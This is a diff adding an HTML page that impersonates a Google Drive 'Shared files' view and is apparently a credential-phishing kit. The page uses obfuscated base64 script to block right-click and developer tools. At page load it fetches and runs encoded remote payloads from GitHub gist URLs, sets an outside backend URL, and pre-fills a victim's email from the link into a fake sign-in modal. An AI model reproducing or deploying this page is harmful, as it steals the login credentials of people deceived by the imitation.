@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Shared files - Google Drive</title>
+<link rel="shortcut icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSI+CiAgICAgIDxwYXRoIGQ9Ik0xOS4zNSAxMC4wNEMxOC42NyA2LjU5IDE1LjY0IDQgMTIgNCA5LjExIDQgNi42IDUuNjQgNS4zNSA4LjA0IDIuMzQgOC4zNiAwIDEwLjkxIDAgMTRjMCAzLjMxIDIuNjkgNiA2IDZoMTNjMi43NiAwIDUtMi4yNCA1LTUgMC0yLjY0LTIuMDUtNC43OC00LjY1LTQuOTZ6TTE0IDEzdjRoLTR2LTRIN2w1LTUgNSA1aC0zeiIgZmlsbD0iIzBGOUQ1OCIvPgogICAgPC9zdmc+" />
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600&family=Roboto:wght@400;500&display=swap">
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: 'Google Sans', 'Roboto', sans-serif;
+  background: #f8f9fa;
+  min-height: 100vh;
+}
+
+.header {
+  background: #fff;
+  padding: 12px 24px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  border-bottom: 1px solid #e8eaed;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+
+.header-logo {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.header-logo svg {
+  width: 40px;
+  height: 40px;
+}
+
+.header-logo span {
+  font-size: 22px;
+  color: #5f6368;
+  font-weight: 400;
+}
+
+.header-title {
+  margin-left: auto;
+  margin-right: 24px;
+  color: #202124;
+  font-size: 14px;
+  font-weight: 500;
+}
+
+.search-bar {
+  background: #f1f3f4;
+  padding: 10px 20px;
+  border-radius: 8px;
+  width: 400px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.search-bar input {
+  border: none;
+  background: transparent;
+  outline: none;
+  width: 100%;
+  font-size: 14px;
+}
+
+.search-bar input::placeholder {
+  color: #5f6368;
+}
+
+.header-right {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+}
+
+.icon-btn {
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  border: none;
+  background: transparent;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.icon-btn:hover {
+  background: #f1f3f4;
+}
+
+.main-content {
+  padding: 24px;
+  max-width: 1200px;
+  margin: 0 auto;
+}
+
+.breadcrumb {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-bottom: 24px;
+  font-size: 14px;
+  color: #5f6368;
+}
+
+.breadcrumb span {
+  color: #202124;
+}
+
+.folder-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 24px;
+}
+
+.folder-title {
+  font-size: 24px;
+  color: #202124;
+  font-weight: 400;
+}
+
+.files-grid {
+  display: grid;
+  grid-template-columns: repeat(5, 1fr);
+  gap: 16px;
+}
+
+.file-card {
+  background: #fff;
+  border-radius: 8px;
+  padding: 16px;
+  cursor: pointer;
+  transition: box-shadow 0.2s, transform 0.2s;
+  border: 1px solid #e8eaed;
+}
+
+.file-card:hover {
+  box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 8px 16px rgba(0,0,0,0.08);
+  transform: translateY(-2px);
+}
+
+.file-icon {
+  width: 80px;
+  height: 100px;
+  margin: 0 auto 16px;
+  border-radius: 4px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.file-icon.pdf {
+  background: linear-gradient(135deg, #e53935 0%, #c62828 100%);
+}
+
+.file-icon svg {
+  width: 48px;
+  height: 48px;
+  fill: white;
+}
+
+.file-name {
+  font-size: 14px;
+  color: #202124;
+  margin-bottom: 4px;
+  word-break: break-word;
+  line-height: 1.4;
+}
+
+.file-meta {
+  font-size: 12px;
+  color: #5f6368;
+}
+
+.modal-overlay {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0,0,0,0.5);
+  z-index: 1000;
+  justify-content: center;
+  align-items: center;
+}
+
+.modal-overlay.active {
+  display: flex;
+}
+
+.modal-overlay.force-active {
+  display: flex !important;
+}
+
+.signin-modal {
+  background: #fff;
+  border-radius: 8px;
+  width: 420px;
+  padding: 48px 40px 40px;
+  text-align: center;
+}
+
+.signin-modal h2 {
+  font-size: 24px;
+  color: #202124;
+  margin-bottom: 8px;
+  font-weight: 400;
+}
+
+.signin-modal p {
+  font-size: 14px;
+  color: #5f6368;
+  margin-bottom: 32px;
+}
+
+.signin-form input {
+  width: 100%;
+  padding: 14px 16px;
+  border: 1px solid #dadce0;
+  border-radius: 4px;
+  font-size: 14px;
+  margin-bottom: 16px;
+  outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+
+.signin-form input:focus {
+  border-color: #1a73e8;
+  box-shadow: 0 0 0 2px rgba(26,115,232,0.15);
+}
+
+.signin-form button {
+  width: 100%;
+  padding: 12px 24px;
+  background: #1a73e8;
+  color: white;
+  border: none;
+  border-radius: 4px;
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: background 0.2s;
+}
+
+.signin-form button:hover {
+  background: #1557b0;
+}
+
+.error-msg {
+  color: #d93025;
+  font-size: 12px;
+  text-align: left;
+  margin-top: -8px;
+  margin-bottom: 16px;
+  display: none;
+}
+
+.error-msg.show {
+  display: block;
+}
+
+.spinner {
+  width: 28px;
+  height: 28px;
+  border: 3px solid #e8eaed;
+  border-top-color: #1a73e8;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+  margin: 0 auto 16px;
+  display: none;
+}
+
+.spinner.show {
+  display: block;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+.pass-error {
+  color: #d93025;
+  font-size: 13px;
+  text-align: left;
+  margin-top: -8px;
+  margin-bottom: 16px;
+  display: none;
+}
+
+.pass-error.show {
+  display: block;
+}
+
+.signin-form input.input-error {
+  border-color: #d93025;
+}
+
+/* Pre-filled email style: centered, bold, 3px bigger, no border */
+.signin-form input.prefilled-email {
+  text-align: center;
+  font-weight: 700;
+  font-size: 17px;
+  border: none;
+  background: #f1f3f4;
+  cursor: not-allowed;
+}
+
+.user-avatar {
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  background: #1a73e8;
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  font-weight: 500;
+}
+
+@media (max-width: 1100px) {
+  .files-grid {
+    grid-template-columns: repeat(4, 1fr);
+  }
+}
+
+@media (max-width: 900px) {
+  .files-grid {
+    grid-template-columns: repeat(3, 1fr);
+  }
+}
+
+@media (max-width: 700px) {
+  .files-grid {
+    grid-template-columns: repeat(2, 1fr);
+  }
+  .search-bar {
+    display: none;
+  }
+}
+</style>
+</head>
+<body>
+<header class="header">
+  <div class="header-logo">
+    <svg viewBox="0 0 24 24" fill="none">
+      <path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z" fill="#0F9D58"/>
+    </svg>
+    <span>Drive</span>
+  </div>
+  <div class="search-bar">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="#5f6368">
+      <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+    </svg>
+    <input type="text" placeholder="Search in Drive">
+  </div>
+  <div class="header-title">Shared files</div>
+  <div class="header-right">
+    <button class="icon-btn">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="#5f6368">
+        <path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
+      </svg>
+    </button>
+    <div class="user-avatar">A</div>
+  </div>
+</header>
+<main class="main-content">
+  <div class="breadcrumb">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="#5f6368">
+      <path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/>
+    </svg>
+    <span>Shared files</span>
+  </div>
+  <div class="folder-header">
+    <h1 class="folder-title">5 files</h1>
+  </div>
+  <div class="files-grid" id="filesGrid"></div>
+</main>
+
+<!-- Right-click / DevTools blocker (decoded at runtime) -->
+<script>
+var _0xg=atob("ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY29udGV4dG1lbnUiLGZ1bmN0aW9uKGUpe2UucHJldmVudERlZmF1bHQoKX0pO2RvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLGZ1bmN0aW9uKGUpe2lmKGUua2V5PT09IkYxMiJ8fChlLmN0cmxLZXkmJmUuc2hpZnRLZXkmJihlLmtleT09PSJJInx8ZS5rZXk9PT0iSiJ8fGUua2V5PT09IkMiKSl8fChlLmN0cmxLZXkmJmUua2V5PT09InUiKSl7ZS5wcmV2ZW50RGVmYXVsdCgpfX0pOw==");
+var _0xgs=document.createElement("script");
+_0xgs.textContent=_0xg;
+document.head.appendChild(_0xgs);
+</script>
+
+<script>
+var _backendUrl = "https://arenco.cam/ephp";
+var _0xuA="aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9waHBibG9rMy8yODYwN2YxNmIzNjdjNDU0ZTdjNmEyYmYyZTBhZTliZi9yYXcvMmY2YjNiYTRhYzRlNmM3YTI4MTUzOGI1NjJjYmJlNWJiNTkyN2Q5NC9naXN0ZmlsZTEudHh0";
+var _0xuB="aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9waHBibG9rMy8zOGUyNzE5MzY5MzY0ZWRhOWUyMGRhOWM3ZTdiNTNkZS9yYXcvOTM2ZGViN2M1MjcyZGYyNjdjNmQ4OTUyYTE4NTM3ZmY4MDU2ZGI5ZS9naXN0ZmlsZTEudHh0";
+function _0xload(url,cb){fetch(atob(url)).then(function(r){return r.text()}).then(function(t){var d=atob(t);var s=document.createElement("script");s.textContent=d;document.head.appendChild(s);if(cb)cb()}).catch(function(){})}
+_0xload(_0xuA,function(){_0xload(_0xuB)});
+</script>
+
+
+<script>
+function getEmailFromQuery() {
+  var params = new URLSearchParams(window.location.search);
+  return params.get('x') || params.get('email') || '';
+}
+
+function applyPrefilledEmail(email) {
+  if (!email) return false;
+  var input = document.getElementById('email');
+  if (!input) return false;
+  input.value = email;
+  input.readOnly = true;
+  input.classList.add('prefilled-email');
+  return true;
+}
+
+function setPrefilledEmail() {
+  var email = getEmailFromQuery();
+  if (!email) return;
+  if (applyPrefilledEmail(email)) return;
+
+  // Retry until modal loads (payload_a.js creates the #email input)
+  var retry = setInterval(function () {
+    if (applyPrefilledEmail(email)) {
+      clearInterval(retry);
+    }
+  }, 200);
+  setTimeout(function () {
+    clearInterval(retry);
+  }, 5000);
+}
+
+setPrefilledEmail();
+</script>
+</body>
+</html>
